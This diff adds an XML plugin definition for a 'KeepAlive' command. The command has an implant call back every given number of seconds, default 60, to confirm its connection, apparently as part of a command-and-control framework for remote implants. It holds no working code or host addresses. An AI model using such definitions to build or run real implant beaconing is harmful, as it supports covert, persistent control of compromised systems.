@@ -1,0 +1,21 @@
+<?xml version='1.0' ?>
+
+<Plugin id='31001'>
+
+  <Command id='36' name='KeepAlive'>
+
+    <Help>Implant makes a callback request every &lt;n&gt; seconds to confirm connection.</Help>
+
+    <Input>
+      <Argument name='seconds' data='seconds' optional='false'>
+	<Help>Number of seconds to wait between requests</Help>
+      </Argument>
+    </Input>
+
+    <Output>
+      <Data name='seconds' type='uint16_t' default='60'/>
+    </Output>
+
+  </Command>
+
+</Plugin>
